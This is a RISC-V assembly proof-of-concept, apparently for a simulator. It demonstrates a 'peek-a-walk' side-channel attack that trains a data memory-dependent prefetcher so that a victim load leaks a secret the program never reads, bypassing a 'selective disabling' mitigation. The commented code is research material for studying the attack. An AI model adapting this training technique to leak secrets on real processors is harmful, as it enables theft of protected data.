# this program demonstrates the peek-a-walk attack for the intel dmp
# this can bypass selective disabling:
# leak secrets which are otherwise never accessed by the program

# this program contains an array with public data, and a secret is stored somewhere in memory
# the attacker maliciously trains the intel dmp, which matches learned patterns on the lowest 10 pc bits
# a later victim load whose pc bits match the trained pattern triggers the dmp, leaking a value stored stride*16 bytes after the address of the victim load
# the attacker can fine-tune the stride and choose which victim load triggers the dmp, potentially leaking secrets at any address
# we demonstrate it with a stride of 4 bytes, where the victim load for 'target' triggers the dmp, leaking a secret stored 16 words further

# selective disabling: the program never actively accesses the secret, so selective disabling never disables the DMP here

.globl _start
.data
    .balign 16
    values: .word 10, 11, 12, 13, 14, 15, 16, 17 # the pointers in array_of_pointers will point to these values (2 cache blocks)
    array_of_pointers: .zero 32 # array of 8 pointers (2 cache blocks)
    padding: .zero 256 # large gap so out of bounds prefetching will never reach it during the training loop
    .balign 16
    target: .word 67
    .zero 60 # target + 15 words of padding
    secret: .word 2148260877, 0, 0, 0, 0

.text
_start:

attack_setup:
    # t0 = index, start at 0
    mv t0, x0
    # t1 = array_of_pointers base address
    la t1, array_of_pointers
    # t2 = array_of_pointers size
    li t2, 8
    # t3 = values base address
    la t3, values

# init array_of_pointers
init_loop:
    # t4 = &array_of_pointers[index]
    slli t4, t0, 2
    add t4, t1, t4

    # t5 = &values[index]
    slli t5, t0, 2
    add t5, t3, t5

    # array_of_pointers[index] = &values[index]
    sw t5, 0(t4)

    # index++
    addi t0, t0, 1

    # init_loop end: jump to init_loop if index != array_size
    bne t0, t2, init_loop

training:
    # t0 = index, start at 0
    mv t0, x0

# train the dmp: access and dereference the 8 pointers
.balign 1024
training_loop:
    .rept 32
        nop
    .endr

    # t4 = array_of_pointers[index]
    slli t4, t0, 2
    add t4, t1, t4
    lw t4, 0(t4)

    # t5 = *array_of_pointers[index]
    lw t5, 0(t4)

    # index++
    addi t0, t0, 1

    # training_loop end: jump to training_loop if index != array_size
    bne t0, t2, training_loop

# victim loads target, triggering the dmp to leak secret
victim:
    la t4, target
    # align the pc
    .balign 1024
    .rept 34
        nop
    .endr
    lw t5, 0(t4)

finish:
    .rept 128
        nop
    .endr
    lui ra,0x10000
    li sp,4
    sb sp,0(ra)
    .rept 64
        nop
    .endr
